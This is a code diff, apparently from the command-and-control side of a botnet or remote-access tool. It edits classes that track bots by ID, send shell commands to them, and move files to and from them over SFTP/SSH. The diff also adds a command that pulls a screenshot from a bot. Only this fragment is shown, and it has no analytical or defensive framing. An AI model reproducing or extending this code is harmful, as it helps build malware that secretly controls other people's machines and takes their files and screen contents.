@@ -13,7 +13,7 @@ from threading import Thread
 class FTP(object):
 
  def __init__(self, file, bot, download=True):
-  self.sftp = sftp.sFTP(const.FTP_IP_SERVER, const.FTP_PORT, max_time=60, verbose=True)
+  self.sftp = sftp.sFTP(const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
   self.bot_id = bot['bot_id']
   self.shell = bot['shell']
   self.download = download
@@ -31,8 +31,8 @@ class FTP(object):
   self.time = self.sftp.time_elapsed
   self.success = True if self.sftp.error_code != -1 else False
 
- def recv(self, file):
-  self.shell.send(code=4, args=file)
+ def recv(self, code, file=None):
+  self.shell.send(code=code, args=file)
   self.is_alive = True
   self.sftp.recv()
   self.is_alive = False
@@ -102,7 +102,7 @@ class Interface(object):
    if self.ssh:
     self.ssh.close()
 
-   self.ssh = ssh.SSH(const.SSH_IP_SERVER, const.SSH_PORT, max_time=30, verbose=True)
+   self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT, max_time=30, verbose=True)
    sock_obj = self.ssh.start()
 
    if sock_obj:
@@ -135,9 +135,9 @@ class Interface(object):
    else:
     self.ftp.close()
   
-  self.ftp = ftp_obj = FTP(file, bot, download=True if cmd_id == 4 else False)
-  ftp_func = self.ftp.send if cmd_id == 3 else self.ftp.recv
-  ftp_thread = Thread(target=ftp_func, args=[file])
+  self.ftp = ftp_obj = FTP(file, bot, download=False if cmd_id == 3 else True)
+  ftp_func = self.ftp.send if cmd_id == 3 else self.ftp.recv 
+  ftp_thread = Thread(target=ftp_func, args=[cmd_id, file])
   ftp_thread.daemon = True
   ftp_thread.start()
 
@@ -163,11 +163,11 @@ class Interface(object):
 
   if cmd_id == 1:
    return self.ftp_status()
-  elif any([cmd_id == 3, cmd_id == 4]):
-   return self.ftp_obj(bot_id, cmd_id, args[0], override)
+  elif any([cmd_id == 3, cmd_id == 4, cmd_id == 5]):
+   return self.ftp_obj(bot_id, cmd_id, args[0] if cmd_id != 5 else 'a screenshot', override)
   else:
    bot = self.get_bot(bot_id)
    if bot:
     bot['shell'].send(code=cmd_id, args=args)
-    return 'Sent command successfully'
+    return 'Command sent successfully'
   return 'Failed to send command'
